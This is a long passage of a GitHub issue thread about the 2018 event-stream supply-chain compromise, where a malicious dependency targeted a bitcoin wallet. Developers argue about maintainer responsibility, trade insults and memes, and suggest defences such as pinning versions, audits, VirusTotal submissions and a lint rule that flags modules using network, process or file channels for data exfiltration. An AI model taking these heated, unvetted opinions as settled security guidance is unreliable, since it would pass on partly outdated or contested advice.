1918	"> Joshua isn't a troll. His native language clearly isn't English and he's probably in charge of ""making things work"" in some small company. Now the build of his app is broke and he's desperately asking for help online -- which is annoying, I know, but I guess his boss is yelling at him as he types his messages in this thread so he has no time to consider the annoyance his messages may rise.
> 
> Unfortunately he's probably used to the ""just type npm install whatever"" answers the javascript community loves to provide, always lacking a proper explanation for the why.
> 
> Maybe you guys don't know but Joshua is how most of the javascript community looks like.

I like how you've created an entire thought piece based on a infantilising / patronising progressive fantasy. Does Joshua also walk his donkey 5 miles to the nearest electricity pump? Does he maintain a family of 10 based on spoon fed information from github?

Or is he an idiot too lazy to read the through thread?"
1919	How to fix it? How to remove this dependency?
1920	Just throwing it out there: I'd be happy to maintain this lib :+1: 
1921	I'd be careful directly referencing this issue (or any other GH issue related to this problem) for fear of openly advertising that your code is potentially compromised as well 😄 
1922	The malware is harmless for anything but the bitcoin wallet package it's targeting.
1923	"> How to fix it? How to remove this dependency?

File an issue for the affected dependencies."
1924	"@bn-l 

> Does Joshua also walk his donkey 5 miles to the nearest electricity pump? Does he maintain a family of 10 based on spoon fed information from github?
> 
> Or is he an idiot too lazy to read the through thread?

My point is that many (most?) modern web devs aren't used to actually understand what they're doing. They just keeping going from tutorial to tutorial replicating things until something work.

Add this to the very common scenario where devs are under pressure of deadlines... We wnd up with many people acting as Joshua. This is a reality.

"
1925	"![dont-panic](https://user-images.githubusercontent.com/5319267/49094449-95496000-f266-11e8-951e-97ad77ed3e92.gif)
"
1926	@dominictarr you really should lock this conversation as it is going off the rails
1927	@alallier this package is going off the rails 🤣 
1928	"These security fiascos keep happening over and over again because our community just don't care/don't know about security. It's not part of our culture. We always talk about the new cool shiny functional lib and forget about everything else.

The only way to make these fiascos stop is changing our culture. A good ecosystem isn't just one with millions of projects, it's also one we can trust.
"
1929	"> Be your own bank

When I worked for a large financial institutions it was common to see a corporate policy that ensure that every open sourced library we used for our codebase went through a security audit and had to be cleared for use in any software written in house.  One institution even went as far as running their own internal package servers and having restrictive firewall rules so that only certain groups of people in a specific subnet were able to download the raw packages from the public internet so it could be staged for a proper code review before being released into the internal development teams.

It's easy to put the blame on @dominictarr for giving commit access to an unknown party but if you really think about it there are other similar vectors where this could apply.   His development box could have been compromised and the package servers could be compromised.  This [isn't even the first time this problem has been brought to the public's attention](http://blog.npmjs.org/post/163723642530/crossenv-malware-on-the-npm-registry).  

Take this as an opportunity to think about your current development processes and figure out how you could implement some security best practices with your own respective projects specially if it is dealing with money and other sensitive information.  Like my late grandpa always told us: ""An ounce of prevention is worth a pound of cure."" 

In the meantime I think the solution is to use a known good version of `event-stream` which does not have the malicious dependency as had been suggested earlier in this thread.  
"
1930	"> Be your own bank

When I worked for a large financial institutions it was common to see a corporate policy that ensure that every open sourced library we used for our codebase went through a security audit and had to be cleared for use in any software written in house.  One institution even went as far as running their own internal package servers and having restrictive firewall rules so that only certain groups of people in a specific subnet were able to download the raw packages from the public internet so it could be staged for a proper code review before being released into the internal development teams.

It's easy to put the blame on @dominictarr for giving commit access to an unknown party but if you really think about it there are other similar vectors where this could apply.   His development box could have been compromised and the package servers could be compromised.  This [isn't even the first time this problem has been brought to the public's attention](http://blog.npmjs.org/post/163723642530/crossenv-malware-on-the-npm-registry).  

Take this as an opportunity to think about your current development processes and figure out how you could implement some security best practices with your own respective projects specially if it is dealing with money and other sensitive information.  Like my late grandpa always told us: ""An ounce of prevention is worth a pound of cure."" 

In the meantime I think the solution is to use a known good version of `event-stream` which does not have the malicious dependency as had been suggested earlier in this thread.  
"
1931	"I think before it is locked we should document the entire collective hatred of javascript developers as a reminder for people in the future.

Considering installing any single dependency pulls along about 137 others, auditing this stuff has become a full time job. Innocent mistake that is costing thousands of developer hours / dollars.

If you're an open source contributor, take note ^"
1932	@dominictarr Dominic, please don't despair of all the hate being flung your way - people just want to blame somebody - you did good work on the original package, your time is valued by many and the fact that you transferred the package to a maintainer who turned out to be a dick isn't your fault by any conceivable means. Stay strong!
1933	"> Be your own bank

When I worked for a large financial institutions it was common to see a corporate policy that ensure that every open sourced library we used for our codebase went through a security audit and had to be cleared for use in any software written in house.  One institution even went as far as running their own internal package servers and having restrictive firewall rules so that only certain groups of people in a specific subnet were able to download the raw packages from the public internet so it could be staged for a proper code review before being released into the internal development teams.

It's easy to put the blame on @dominictarr for giving commit access to an unknown party but if you really think about it there are other similar vectors where this could apply.   His development box could have been compromised and the package servers could be compromised.  This [isn't even the first time this problem has been brought to the public's attention](http://blog.npmjs.org/post/163723642530/crossenv-malware-on-the-npm-registry).  

Take this as an opportunity to think about your current development processes and figure out how you could implement some security best practices with your own respective projects specially if it is dealing with money and other sensitive information.  Like my late grandpa always told us: ""An ounce of prevention is worth a pound of cure."" 

In the meantime I think the solution is to use a known good version of `event-stream` which does not have the malicious dependency as had been suggested earlier in this thread.  
"
1934	"> How to fix it? How to remove this dependency?

File an issue for the affected dependencies.

> These security fiascos keep happening over and over again because our community just don't care/don't know about security. It's not part of our culture. We always talk about the new cool shiny functional lib and forget about everything else.

Well, we have now CVEs for npm packages too. And it's growing. It is software like any other software. SRE, Incident Management, Security by Design, npm and GitHub fallbacks, ... it is a (big) process which requires special knowledge and experience."
1935	"How I'd sum up this thread
![mvel2kw](https://user-images.githubusercontent.com/16866642/49094945-b5c5ea00-f267-11e8-857d-3215ad96822e.jpg)
"
1936	At least now we have to care (GDPR) and present strategies (react / what to do). See https://github.com/andrewhowdencom/talk-oh-god-everything-is-on-fire/blob/master/slides/2018-10-18.pdf and the SRE books by Google. Great stuff.
1937	Javascript is dangerous, let’s use [Rust](https://rust-lang.org)!
1938	"> Javascript is dangerous, let’s use [Rust](https://rust-lang.org)!

Not a solution here. A solution is to know what to do in this case to act properly. Also Deno by the creator of Node.js is a concept that will hopefully make JavaScript more secure."
1939	OOC, but related: https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5
1940	@VitalyAnkh npm uses rust btw
1941	"> Javascript is dangerous, let’s use Rust!

It's not a problem with the language, it's a problem with how it handles trust and security (and it's not just npm, there might be other package managers with the same problems)

My 2 cents to this whole thing:

Someone above mentioned that npm should warn if upgrading a package to a version owned/published by a different author.
This might be a way forward, but other solutions/protections are needed, too."
1942	"> It's not a problem with the language, it's a problem with how it handles trust and security (and it's not just npm, there might be other package managers with the same problems)

Exactly.

> @VitalyAnkh npm uses rust btw

Would be new to me."
1943	"> Not a solution here. 

He wasn't really proposing it. ""Rewrite X in Rust"" is a recent joke.

https://github.com/ansuz/RIIR"
1944	"> @VitalyAnkh npm uses rust btw

It is just the registry, not the tool `npm`.

https://www.reddit.com/r/rust/comments/5h3u4n/weve_gained_a_new_friend_npm/"
1945	"> there is real downstream damage to companies. people lose jobs.

Well, if there job was to write a secure crypto coin wallet and they automatically pull in updates to unknown dependencies or allow their browser scripts to be attacked via other scripts on the same page, then it is their fault.   If they built their company based on such software and didn't vet the software, then again it's their fault.  It's not Dominic's fault that someone used his code improperly in the presence of sensitive financial software.  I doubt anyone personally contacted him about this module and he agreed to keep it secure."
1946	"> there is real downstream damage to companies. people lose jobs.

This happens on a daily basis that there are CVEs / vulns. In every software. And there are jobs who are responsible (CISO and so on)."
1947	Wow this even broke Vue, time to get better regulations on npm and rethink open source in a modular and package based world.
1948	"> He wasn't really proposing it. ""Rewrite X in Rust"" is a recent joke.
> 
> https://github.com/ansuz/RIIR

Ah ok, was not aware of this =)"
1949	I was thinking of writing a tool to do check dependencies for potential malicious actions and bring them to the attention of a human. There are a finite number of ways to do data exfiltration in node (http, net, udp, child_process, fs, native modules, etc), and it would be relatively straightforward to write an eslint plugin based on eslint-plugin-node's no-deprecated-api rule to catch all of the cases that we have observed. Obviously it would require continuous updates to check new patterns, etc, but it can at least get the easy ones. The hard part is that the false positive count would be quite large, possibly prohibitively large. With a tool such as this, the code here would have stuck out like a sore thumb, because a module named flatmap-stream has no business using crypto.
1950	"> I was thinking of writing a tool to do check dependencies for potential malicious actions and bring them to the attention of a human. There are a finite number of ways to do data exfiltration in node (http, net, udp, child_process, fs, native modules, etc), and it would be relatively straightforward to write an eslint plugin based on eslint-plugin-node's no-deprecated-api rule to catch all of the cases that we have observed. Obviously it would require continuous updates to check new patterns, etc, but it can at least get the easy ones. The hard part is that the false positive count would be quite large, possibly prohibitively large. With a tool such as this, the code here would have stuck out like a sore thumb, because a module named flatmap-stream has no business using crypto.

Well, we are reinventing AV - in Node.js. I think this should be handled by actual AV vendors and solutions like Nodesource, auditjs, snyk and so on.

Also behavioral analysis is often manually done when we send the samples to the AV vendors."
1951	"> > Be your own bank
> 
> When I worked for a large financial institutions it was common to see a corporate policy that ensure that every open sourced library we used for our codebase went through a security audit and had to be cleared for use in any software written in house. One institution even went as far as running their own internal package servers and having restrictive firewall rules so that only certain groups of people in a specific subnet were able to download the raw packages from the public internet so it could be staged for a proper code review before being released into the internal development teams.
> 
> It's easy to put the blame on @dominictarr for giving commit access to an unknown party but if you really think about it there are other similar vectors where this could apply. His development box could have been compromised and the package servers could be compromised. This [isn't even the first time this problem has been brought to the public's attention](http://blog.npmjs.org/post/163723642530/crossenv-malware-on-the-npm-registry).
> 
> Take this as an opportunity to think about your current development processes and figure out how you could implement some security best practices with your own respective projects specially if it is dealing with money and other sensitive information. Like my late grandpa always told us: ""An ounce of prevention is worth a pound of cure.""
> 
> In the meantime I think the solution is to use a known good version of `event-stream` which does not have the malicious dependency as had been suggested earlier in this thread.

Nuff said my good man. The amount of entitlement, ignorance, disinformation and outright hatred in this thread is staggering. Everyone using this project should be grateful and not blame the author(s) for not having done the due diligence.

Throwaway account for reasons."
1952	"It looks like quite a lot of comments got deleted since yesterday: can we do that again for all the small, throw-away comments that have piled up since? Or lock this thread and move the conversation on ""what to do next"" to somewhere that won't garner more jokes and comments that are just lengthy ""+1""s instead of adding anything new to the actual issue?"
1953	"

> > Be your own bank
> 
> When I worked for a large financial institutions it was common to see a corporate policy that ensure that every open sourced library we used for our codebase went through a security audit and had to be cleared for use in any software written in house. One institution even went as far as running their own internal package servers and having restrictive firewall rules so that only certain groups of people in a specific subnet were able to download the raw packages from the public internet so it could be staged for a proper code review before being released into the internal development teams.

This is, like, solid software development 101, I can't imagine not firewalling the CI machine and letting it download packages from third parties willy nilly."
1954	"> > I was thinking of writing a tool to do check dependencies for potential malicious actions and bring them to the attention of a human. There are a finite number of ways to do data exfiltration in node (http, net, udp, child_process, fs, native modules, etc), and it would be relatively straightforward to write an eslint plugin based on eslint-plugin-node's no-deprecated-api rule to catch all of the cases that we have observed. Obviously it would require continuous updates to check new patterns, etc, but it can at least get the easy ones. The hard part is that the false positive count would be quite large, possibly prohibitively large. With a tool such as this, the code here would have stuck out like a sore thumb, because a module named flatmap-stream has no business using crypto.
> 
> Well, we are reinventing AV - in Node.js. I think this should be handled by actual AV vendors and solutions like Nodesource, auditjs, snyk and so on.
> 
> Also behavioral analysis is often manually done when we send the samples to the AV vendors.

While yes I agree that reinventing the wheel is counterproductive, clearly the existing wheels have failed us. As many people have said, you are responsible for your own dependencies. As many other people have said, the cost of doing that at this time is prohibitively large for most people. There needs to be some sort of tooling to help with this."
1955	"> It looks like quite a lot of comments got deleted since yesterday

I can still see them. There is a `Read more...`."
1956	"> ""what to do next

That should be clear. Either pin to a previous release or the latest ones, regenerate lockfiles or migrate away."
1957	"Rewrite everything with F# :) Literally : https://fable.io/repl/
"
1958	"> While yes I agree that reinventing the wheel is counterproductive, clearly the existing wheels have failed us. As many people have said, you are responsible for your own dependencies. As many other people have said, the cost of doing that at this time is prohibitively large for most people. There needs to be some sort of tooling to help with this.

Adyen, Snyk, NodeSource, some AV vendors and a few more are currently working on some solutions. And there is also pkgsign, Intrensic, Deno, ..."
1959	@dominictarr I'll be forever grateful for your passion and dedication, ignore people trying to bring you down, you're doing Lord's work.
1960	While there's plenty of blame to go around, I have a gut feeling this isn't the last time we'll see something like this. A little malicious social engineering is all it takes to affect millions of people, apparently.
1961	"> Adyen, Snyk, NodeSource, some AV vendors and a few more are currently working on some solutions. And there is also pkgsign, Intrensic, Deno, ...

I will admit that I am not familiar with all of those solutions/technologies, and while I am sure that they are all great solutions, clearly existing solutions are not sufficient (although they may be someday, hopefully someday soon) because this one was found by dumb luck."
1962	"Current state of the entitled NPM world:
> uses free package knowing full-well it is open source and always has the potential to be prone to bugs and malicious code (as does any other software) while gladly taking updates and free development, instead of forking and maintaining on own.

> *bad thing happens*

> proceeds to bash developer that put effort into building software so they didn't have to and then shifts blame when poor dependency management and evaluation catches up to them

> repeat"
1963	"> While there's plenty of blame to go around, I have a gut feeling this isn't the last time we'll see something like this

And it is not the first and last one. See https://github.com/nodejs/security-wg/"
1964	"Regarding @dominictarr ... the idea that he only deserves praise seems silly.  Just as he deserves credit for the useful work he did, he similarly deserves criticism for his role in spreading malware. Dominic is not solely responsible for the failure here, but he certainly deserves blame for a very large portion of the problem.

For any maintainer who knows their package is a widespread dependency, Dominic's level of apathy about irresponsibly turning over control to a complete stranger so easily CANNOT be encouraged. 

Yes, every dev using NPM knows this has always been a risk, so we should all take a hard look in the mirror but if maintainers of popular packages bear no responsibility to be security-vigilant, then the ecosystem will just have to die."
1965	Risk evaluation and management is one of the things that we have to consider (we devs, see GDPR). And many companies have internal policies. The processes and lack of experience and knowledge and a few more factors are the main issues.
1966	"> OOC, but related: https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5

Yeeeep -- posted a comment on that article linking to this a bit ago. Kinda nutty, huh?"
1967	"> > uses free package knowing full-well it is open source and always has the potential to be prone to bugs and malicious code (as does any other software) while gladly taking updates and free development, instead of forking and maintaining on own.
> 
package ownership is handed over to some random dude
> 
> > _bad thing happens_

fixed"
1968	"> package ownership is handed over to some random dude

We're all random dudes my dude. Stop trying to shift blame here."
1969	"> > package ownership is handed over to some random dude
> 
> We're all random dudes my dude. Stop trying to shift blame here.

But that random dude is more random than the random dude who maintained it at first"
1970	"@joshua1135 is trolling guys. Chill

> How I'd sum up this thread
> ![mvel2kw](https://user-images.githubusercontent.com/16866642/49094945-b5c5ea00-f267-11e8-857d-3215ad96822e.jpg)

I always think why they always use this kind of unrelated pictures for their cover books 🤔"
1971	"> But that random dude is more random the random dude who maintained it at first

I'd like to know how you measure the level of randomness.

Nevermind, I'm just going to use the randomness-measurer package so I can blindly add it into all my production apps.

    sudo npm install randomness-measurer

What could go wrong anyway..."
1972	@ihavenonickname if you looked at the Github history of @right9ctrl vs that of the maintainer of this package, I think it would be pretty obvious that one is way more random than the other.
1973	"> > But that random dude is more random the random dude who maintained it at first
> 
> I'd like to know how you measure the level of randomness.
> 
> Nevermind, I'm just going to use the randomness-measurer package so I can blindly add it into all my production apps.
> 
> ```
> sudo npm install randomness-measurer
> ```
> What could go wrong anyway...

This is definitely the best solution for the current situation. Damn this one cracked me up good! :rofl: "
1974	Wordpress spoted 🤔
1975	"> Wordpress spoted

How is this related?"
1976	"> > package ownership is handed over to some random dude
> 
> We're all random dudes my dude. Stop trying to shift blame here.

@throwawayyyyyyyy You missed the point here because I didn't try to _shift_ the blame... Completely agree with @mscarborough-lampdev here:

> Regarding @dominictarr ... the idea that he only deserves praise seems silly. Just as he deserves credit for the useful work he did, he similarly deserves criticism for his role in spreading malware. Dominic is not solely responsible for the failure here, but he certainly deserves blame for a very large portion of the problem.

> For any maintainer who knows their package is a widespread dependency, Dominic's level of apathy about irresponsibly turning over control to a complete stranger so easily CANNOT be encouraged.

> Yes, every dev using NPM knows this has always been a risk, so we should all take a hard look in the mirror but if maintainers of popular packages bear no responsibility to be security-vigilant, then the ecosystem will just have to die.

And to be clear, no one is trying to ""bring him down"" as some people stated, but this could be avoided in so many ways if the original maintainer understood the responsibility behind his actions."
1977	anyone here play fortnite? 
1978	"To decide whether the original maintainer should be blamed or not, answer:

Did the original maintainer break the legal warranty of the project?
"
1979	"> To decide whether the original maintainer should be blamed or not, answer:
> 
> Did the original maintainer break the legal warranty of the project?

You are mixing responsibility with legal issues. Didn't read all 600+ comments but I suppose no one pointed out any legal issues and I hope everyone here understands the difference."
1980	"> You are mixing responsibility with legal issues.

I see your point, but in this case legal responsibility is the only responsibility we should be considering. Anything else is fundamentally pure rant imho.

Why would we expect the original maintainer to do things he never promised to do? 
"
1981	"@ihavenonickname just because it's not illegal to include security issues in your software doesn't mean it's ok to do so. Responsibilities exist, no matter the legal aspect.
This is like theory vs. practice. In theory, yes, only legal stuff matters. But we don't live in a theoretical world, things are a lot more complex than just a binary assessment of ""is it legal or not""."
1982	"> 
> 
> > You are mixing responsibility with legal issues.
> 
> I see your point, but in this case legal responsibility is the only responsibility we should be considering. Anything else is fundamentally pure rant imho.
> 
> Why would we expect the original maintainer to do things he never promised to do?

By this logic, I can make add-two-numbers on NPM, let it sit for a while until it gains enough traction from idiots, and then hand over the project to the first guy who emails me, and I should expect no blowback when that guy injects malicious code, because maintainers are never wrong and it's on the users to manually scan 1,296 ancillary dependencies in their projects.  

My (hypothetical) failure to vet the next maintainer of a (hypothetical) popular project would have been just that: A failure.  This behaviour should not be encouraged and NPM should set up some guidelines on peaceful changings of the guard, if not full-blown clauses in their terms of service.

Just because it's legal doesn't mean it wasn't stupid."
1983	"> > > uses free package knowing full-well it is open source and always has the potential to be prone to bugs and malicious code (as does any other software) while gladly taking updates and free development, instead of forking and maintaining on own.
> 
> package ownership is handed over to some random dude
> 
> > > _bad thing happens_
> 
> fixed

Random dude who trusted random dude on the internet for no reason (and could have just as easily been malicious himself the whole time), gets mad at same random dude on the internet for transferring code to new random dude on the internet.

This is the unfettered type of incompetency we are currently dealing with in the JS community... "
1984	"> > You are mixing responsibility with legal issues.
> 
> I see your point, but in this case legal responsibility is the only responsibility we should be considering. Anything else is fundamentally pure rant imho.
> 
> Why would we expect the original maintainer to do things he never promised to do?

""Pure rant"" is perfectly put in this case, however, you simply cannot say that he has 0 responsibility. Imho, this is yet another hard kick into NPM's already troubled environment and putting NPM in the light of ""who cares about responsibility"" will definitely make even more harm to it...

I personally will from now on even more advocate less usage of unnecessary dependencies (as if it is even possible with npm) and as a consequence probably try to move away from JS completely because I simply don't see it reliable if community takes no responsibility for code they write."
1985	"@LaurentTreguier

> This is like theory vs. practice

_In practice_ people do stupid things and we must consider this.

Of course giving your project to a random dude is bad, but so what? People do bad things _in practice_, and if you don't take precautions you'll end up ranting on an online thread.

These ""moral responsibilities"" only exist _in theory_.

Don't get me wrong, I know life would be easier if we could trust everyone, but that's not the case, unfortunately -- especially on the Internet!
"
1986	"I agree with @ihavenonickname.
Someone made code accessible, so what? Half the world downloaded it, so what?
People who care enough use tools like https://snyk.io, and big companies have entire departments dedicated to vetting tools and libraries.

The stupid thing is to build important software using random unverified tools published by random people on an internet that is known to contain huge numbers of attack vectors.
I guess this is a part of an entire eco-system growing up. We as a community should avoid blaming people and instead find ways forward that prevent this kind of thing happening again.

Trusting people (and code) allows us to make really quick progress, but verifying people (and code) allows us to make good, secure software."
1987	"> Don't get me wrong, I know life would be easier if we could trust everyone, but that's not the case, unfortunately -- especially on the Internet!

This is so true

![image](https://user-images.githubusercontent.com/933490/49104211-65d92a00-f24b-11e8-91d7-547d48cd4c35.png)
"
1988	"> These ""moral responsibilities"" only exist _in theory_.

That's where you're wrong. You're just brushing off mistakes as if they were of no importance whatsoever, when it's clearly not the case. You can't just say that people don't have responsibilities.
The fact is, lots of people trusted this package; the responsibility here was simply not a choice, it imposed itself. But that doesn't mean it didn't exist."
1989	(Just to be clear, I'm not implying we should lynch the maintainer for what he did... We all make mistakes, and I'm the first to make them)
1990	@LaurentTreguier I think the crux of the issue is that this moral obligation/responsibility did not and does not exist in the minds of all involved parties.
1991	"@LaurentTreguier 

> lots of people trusted this package

They trusted, yes, based on the assumption that the maintainer wouldn't do anything stupid.

Guess what, this assuption was wrong. Yet another case of expectation vs reality.

Whenever we depend on people not being stupid we'll fail sooner or later.

I'm being pragmatic.
"
1992	"@ISNIT0 
> Someone made code accessible, so what? Half the world downloaded it, so what?

Is ""so what"" an argument or just a personal ""observation""?

> People who care enough use tools like https://snyk.io, and big companies have entire departments dedicated to vetting tools and libraries.

Not everybody knows about these tools and majority of people using JS are not ""big companies"".

> The stupid thing is to build important software using random unverified tools published by random people on an internet that is known to contain huge numbers of attack vectors.

Absolutely true. Does that mean that NPM is completely useless?

> I guess this is a part of an entire eco-system growing up. We as a community should avoid blaming people and instead find ways forward that prevent this kind of thing happening again.

This ecosystem is growing for such a long time and still didn't learn a thing from previous mistakes, that's pretty sad. I agree about the ""blaming"" part, I personally didn't blame him, I even think he thought he's doing a good thing, which someone else abused, as usual... However, this could be avoided on so many levels......

> Trusting people (and code) allows us to make really quick progress, but verifying people (and code) allows us to make good, secure software.

People's laziness and installing ton of dependencies for no reason is what makes ""really quick progress"". Writing your own version of left-pad, is-odd, is-number, lodash and similar is in some companies' eyes waste of time/money, same as ""verifying people and code"", and developers are often ""forced"" to just install a library and get the job done. If we cannot rely on a fact that dependencies we are using are safe, then we better just `rm -rf npm`, open a new blank page and start all over again."
1993	"@ihavenonickname I'm not saying that we should assume people to be always smart... (or even just sometimes). But being stupid still doesn't take responsibilities away (even if I wish it was the case, I'd personally have less of them)

EDIT: another thing I'd want to clarify is that I don't think that only the maintainer is responsible for everything, of course. Everyone using this package also has their own part of responsibility."
1994	"@ludimoru This is exactly how I see it.
Morally responsible: I think the person should do the right thing
Legally responsible: The person will suffer if they do the wrong thing

If someone is building a business on someone else's work, I think it's their:
- moral responsibility to reward/support the work they're benefiting from (as par as is practical)
- legal responsibility to their customers to keep them safe

EDIT: It doesn't matter what ""I think"" their legal responsibility is, but in most cases the above statement is accurate

This will differ from person to person, but expecting every NPM package that's used out there to be supported indefinitely is neither wise, nor sustainable."
1995	"@ISNIT0 This is exactly how I see ""responsibility"":

https://github.com/dominictarr/event-stream/blob/master/package.json#L35"
1996	"@dominictarr can you please close this thread to replies and only allow people like @FallingSnow @jaydenseric to speak? There's a lot of memes and garbage cluttering what was a very good thread. 

Sorry this is happening to your guy's project."
1997	"The good thing is that the AV vendors are slowly catching up now after I've sent them the samples.

https://www.virustotal.com/#/file/8b90859b19e3e3dea8d923996709210ed48ff3249563f56ff12eb1936ffcc295/detection

https://www.virustotal.com/#/file/458b46902ed3b12fa3b9b52528a59a9e3f7e100b7d5c42f3650a996768ad2e53/detection

https://www.virustotal.com/#/file/4949ba537ee2fccb79b99760ee48d10a7a59be51d449c9f4fec4351d16c7f366/detection"
1998	"I searched for ""NodeJS best practices"", the 4th result was this: https://github.com/i0natan/nodebestpractices

It seems fairly comprehensive and non-proprietary.
See item 4.4: https://github.com/i0natan/nodebestpractices#-44-constantly-inspect-for-vulnerable-dependencies

Being an okay developer isn't hard, but being a shit one is super easy (✋). Fortunately for those of us who aren't wizards, smart people usually compile best-practices for all sorts of languages and eco-systems.
It doesn't take much effort to find them, so one may as well do some due-diligence...


Heck, reading them probably counts as billable hours! 😉 "
1999	"> See item 4.4: https://github.com/i0natan/nodebestpractices#-44-constantly-inspect-for-vulnerable-dependencies

Unfortunately outdated, nsp was closed and bought by npm inc and is now `npm audit` and `yarn audit`."
2000	"@GarnetSunset 

We're having a fruitful debate on theorical and practical implications of OSS distribution."
2001	This would not have prevented it because this was added afterwards. See https://github.com/nodejs/security-wg/commit/52745f7283bb5f7a07f809bd946be013cbd1c5c4
2002	"Theory or practice. If you want to stay secure, you shouldn't rely on some random stranger to do it for you.

I think the lesson here for a lot of people is to at least think before they mindlessly add dependencies, and try to understand the possible attack vectors that rely around the dependency ecosystem that has become a viable part of any project in today's world."
2003	quote this if you were around for the great event-stream event of 2018
2004	"> 
> 
> Theory or practice. If you want to stay secure, you shouldn't rely on someone random stranger to do it for you.
> 
> I think the lesson here for a lot of people is to at least think before they mindlessly add dependencies, and try to understand the possible attack vectors that rely around the dependency ecosystem that has become a viable part of any project in today's world.

So I should just re-implement sass myself?"
2005	FWIW, using `npm ls event-stream flatmap-stream` on a repo without the dependencies installed appears to not work as intended.
2006	"@N3X15 Probably not 😉 
But something more practical could be to ask them about (or even God forbid contribute to) their security policies/processes and dependency vetting practices.

I know it's not sexy work, and it takes way more time than `git commit -a -m 'stuff' && git push`, but security and verification are both important parts of software development *and* open source.

If anyone out there has experience doing this stuff, I'll bet _any_ project would love your contributions, insight, and time."
2007	"> FWIW, using `npm ls event-stream flatmap-stream` on a repo without the dependencies installed appears to not work as intended.

Check the lockfile (grep and so on).

But in general lockfiles of dependencies do nothing."
2008	"> > Theory or practice. If you want to stay secure, you shouldn't rely on someone random stranger to do it for you.
> > I think the lesson here for a lot of people is to at least think before they mindlessly add dependencies, and try to understand the possible attack vectors that rely around the dependency ecosystem that has become a viable part of any project in today's world.
> 
> So I should just re-implement sass myself?

You are welcome to do so. It is your own choice, just as trusting unknown maintainers is your own choice. Only you are responsible for the choices you make as a developer using OSS. People are contributing to OSS for free. They are not under any legal obligations to guarantee your security as far as I know"
2009	`npm ci` is not run by the consumer of the dependency in general.
2010	"> I searched for ""NodeJS best practices"", the 4th result was this: https://github.com/i0natan/nodebestpractices
> 
> It seems fairly comprehensive and non-proprietary.
> See item 4.4: https://github.com/i0natan/nodebestpractices#-44-constantly-inspect-for-vulnerable-dependencies

I personally searched such things too, many times, and I was pretty disappointed how many contradictions are in ""JS best practices"" in general, starting from ""always use semicolon"" vs ""never use semicolon"" all the way to package maintaining. But do you really expect that each kid starting coding will use the same query in Google, find the same repo and actually read all of it? And yeah, nowadays, JS is the most acceptable to kids because it's related to Web and it's extremely easy to learn it and the result is this huge amount of trash in NPM repos (not pointing this project directly to be clear).

EDIT: to prove my point of ""contradictions"", the link you pointed out is apparently ""outdated"", judging by @DanielRuf's words... :/

> Being an okay developer isn't hard, but being a shit one is super easy (✋). Fortunately for those of us who aren't wizards, smart people usually compile best-practices for all sorts of languages and eco-systems.

Agreed. But also, isn't that the purpose of NPM? In some way, ""compilation of best practices""? Why re-inventing the wheel and re-writing the whole lodash since it's already here and available to use it immediately and probably written in ""the best way possible""?

> It doesn't take much effort to find them, so one may as well do some due-diligence...

It doesn't take too much effort, not at all. But again, talking from personal experience, this is not what majority of people do. 

> Heck, reading them probably counts as billable hours! 😉

I'm really and honestly happy that this goes into your billable hours, but please understand that it doesn't work everywhere the same.

"
2011	Just want to put it out there that many of us are aware of the best practices, but don't have the bandwidth to implement them all. I work on a very small team at a non-profit. We do our best, but we also absolutely rely on and have to trust the community too. Lots of tools are available for free for OSS and/or have non-profit pricing structures, but not all and we have to prioritize what we can do. I think the best analogy that I can think of is herd immunity. We all should try our best, but there will be some folks in the community that will have to rely on the community to do the right thing. This isn't a bad thing. 
2012	"@srallen This is one of the reasons OSS is great! If this wasn't a popular package, it's quite possible this vulnerability would never have been found! 😄
I can only hope that other organisations with more money will ""pay it forward"" to help the maintainers of projects *and* this world's awesome non-profits and fledgeling companies do great work!

Believe it or not, even just creating a GitHub Issue on a project you use is a great way to support maintainers, if you offer code so much the better!"
2013	"@ISNIT0 
>People who care enough use tools like https://snyk.io, and big companies have entire departments dedicated to vetting tools and libraries.

FWIW, while that is a good service, they did not catch this vulnerability either. The attack was part of the minified code, not part of the visible codebase checked into the repository. The minified code with the attack in it had been published for about three months.

As @FallingSnow [said yesterday, discovering this in the minified code was ""dumb luck""](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441759921)."
2014	"@bomb-on Agreed
The JS world is far from perfect, and loads of people have made loads of mistakes (👋)

I don't think kids should be worrying about writing safe and secure code, but companies usually want to protect themselves, and teach the kids they hire to be better.

In the spirit of Open Source, I created a PR: https://github.com/i0natan/nodebestpractices/pull/293

NPM isn't really a compilation of best practices, it's more a compilation of shit that people could be bothered to create an NPMJS.com account for. Some of that stuff happens to be good and well-maintained, but the vast majority is utter garbage.

😄 I don't know about you, but I can feel a slew of blog posts being published on HN tomorrow about the future of JS!"
2015	"> 
> 
> @N3X15 Probably not 😉
> But something more practical could be to ask them about (or even God forbid contribute to) their security policies/processes and dependency vetting practices.
> 
> I know it's not sexy work, and it takes way more time than `git commit -a -m 'stuff' && git push`, but security and verification are both important parts of software development _and_ open source.
> 
> If anyone out there has experience doing this stuff, I'll bet _any_ project would love your contributions, insight, and time.

I do have experience, and my experience is that the fix will sit in a queue for ten months over some minor bikeshedding, and then I'd still have the ancillary dependencies to worry about.

For instance, look at sass and how many times its sub-dependencies use `is-plain-object` or some other minilib.

```
+-- sass@1.13.4                                                  
| `-- chokidar@2.0.4                                             
|   +-- anymatch@2.0.0                                           
|   | +-- micromatch@3.1.10                                      
|   | | +-- arr-diff@4.0.0                                       
|   | | +-- array-unique@0.3.2 deduped                           
|   | | +-- braces@2.3.2 deduped                                 
|   | | +-- define-property@2.0.2                                
|   | | | +-- is-descriptor@1.0.2                                
|   | | | | +-- is-accessor-descriptor@1.0.0                     
|   | | | | | `-- kind-of@6.0.2                                  
|   | | | | +-- is-data-descriptor@1.0.0                         
|   | | | | | `-- kind-of@6.0.2                                  
|   | | | | `-- kind-of@6.0.2                                    
|   | | | `-- isobject@3.0.1 deduped                             
|   | | +-- extend-shallow@3.0.2                                 
|   | | | +-- assign-symbols@1.0.0                               
|   | | | `-- is-extendable@1.0.1                                
|   | | |   `-- is-plain-object@2.0.4                            
|   | | |     `-- isobject@3.0.1 deduped                         
|   | | +-- extglob@2.0.4                                        
|   | | | +-- array-unique@0.3.2 deduped                         
|   | | | +-- define-property@1.0.0                              
|   | | | | `-- is-descriptor@1.0.2 deduped                      
|   | | | +-- expand-brackets@2.1.4                              
|   | | | | +-- debug@2.6.9 deduped                              
|   | | | | +-- define-property@0.2.5 deduped                    
|   | | | | +-- extend-shallow@2.0.1 deduped                     
|   | | | | +-- posix-character-classes@0.1.1                    
